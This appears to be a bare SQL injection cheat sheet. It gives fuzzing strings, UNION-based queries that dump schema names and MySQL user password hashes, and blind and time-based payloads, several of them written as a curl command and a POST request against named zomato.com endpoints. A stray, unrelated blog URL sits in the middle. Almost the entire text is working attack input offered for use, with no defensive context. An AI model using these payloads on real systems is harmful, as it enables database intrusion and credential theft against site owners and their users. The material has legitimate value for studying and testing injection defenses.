# Fuzzing
'
' or 1=1 #
' or 1=1 --
' or '1'='1

# Find number of columns
' or 1=1 order by x #

# extract data by UNION based attack
' or 1=1 order by x #
' or 1=1 union select NULL,@@version,NULL,NULL,NULL,NULL,NULL #
' or 1=1 union select NULL,table_schema,NULL,NULL,NULL,NULL,NULL from information_schema.columns #
' or 1=1 union select NULL,table_name,table_schema,NULL,NULL,NULL,NULL from information_schema.columns where table_schema="mysql" #
' or 1=1 union select NULL,table_schema,column_name,NULL,NULL,NULL,NULL from information_schema.columns where table_name="user" #
' or 1=1 union select NULL,User,Password,NULL,NULL,NULL,NULL from mysql.user #


https://guzelkokar496.blogspot.com/p/iste-bilgisayar-muhendisligi.html

action=show_support_breakups&brids=["')/**/OR/**/MID(0x352e362e33332d6c6f67,1,1)/**/LIKE/**/5/**/%23"]


False: if @@version starts with a 4:

2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2


if(mid(@@version,1,1)=5 which returns a 200 ok message. If changed for if(mid(@@version,1,1)=4

curl -H 'Host: www.zomato.com' -H 'Cookie: PHPSESSID=XXXXX' 'https://www.zomato.com/████.php?entity_type=restaurant&entity_id=1+or+if(mid(@@version,1,1)=5,1,2)=2%23' -k

POST https://www.zomato.com/php/██████████
res_id=1111&method=add_menu_item_tags&item_id=1111-if(mid(version/*f*/(),1,1)=5,sleep/*f*/(5),0)&new_tags%5B%5D=3&menu_id=1111


res_id=51-CASE/**/WHEN(LENGTH(version())=10)THEN(SLEEP(6*1))END&city_id=0